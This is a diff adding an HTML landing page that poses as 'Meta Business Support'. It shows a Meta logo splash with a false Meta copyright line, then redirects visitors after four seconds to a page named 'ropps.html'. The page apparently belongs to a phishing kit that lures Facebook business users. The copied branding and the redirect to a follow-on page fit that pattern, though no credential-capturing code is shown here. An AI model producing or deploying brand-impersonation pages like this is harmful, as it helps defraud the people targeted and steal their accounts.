@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta property="og:title" content="Meta Page Support">
+    <meta property="og:description" content="Meta">
+    <meta property="og:image" content="https://images.indianexpress.com/2021/12/meta-1.jpg">
+    <meta property="og:url" content="https://images.indianexpress.com/2021/12/meta-1.jpg">
+    <meta property="og:type" content="website">
+
+    <title>Meta Page Support</title>
+
+    <style>
+        #intro {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+
+        /* Ẩn nội dung trang chính */
+        #content {
+            display: none;
+        }
+
+        .logo-container {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    text-align: center;
+    opacity: 0; /* Ban đầu ẩn */
+    transform: scale(0.9); /* Thu nhỏ nhẹ trước khi hiện */
+    transition: opacity 0.5s ease-in-out, transform 0.5s ease-in-out;
+}
+
+#meta-logo {
+    max-width: 80%;
+    height: auto;
+}
+
+#meta-text {
+    font-size: 18px;
+    font-weight: bold;
+    color: Black;
+    margin-top: 10px;
+    font-family: Arial, sans-serif;
+}
+#copyright {
+            font-size: 14px;
+            color: #606770;
+            margin-top: 15px;
+            font-family: Arial, sans-serif;
+        }
+
+    </style>
+</head>
+
+<body>
+
+    <!-- Intro -->
+   <!-- Intro -->
+<!-- Intro -->
+<div id="intro">
+    <div class="logo-container">
+        <img id="meta-logo" src="https://cdn.dribbble.com/userupload/6171212/file/original-4591cc3d8ca4a9f6cbe8081f7c6d16e0.gif" alt="Meta Logo">
+        <p id="meta-text">META BUSINESS SUPPORT</p>
+        <p id="copyright">© Reply Facebook - Meta Platforms © 2025 Meta</p>
+    </div>
+</div>
+
+
+
+<script>
+    window.onload = function () {
+        setTimeout(() => {
+            document.querySelector(".logo-container").style.opacity = "1";
+            document.querySelector(".logo-container").style.transform = "scale(1)";
+        }, 100); // Trễ 0.5s để hiệu ứng đẹp hơn
+
+        setTimeout(() => {
+            window.location.href = "ropps.html";
+        }, 4000);
+    };
+</script>
+
+
+</body>
+</html>
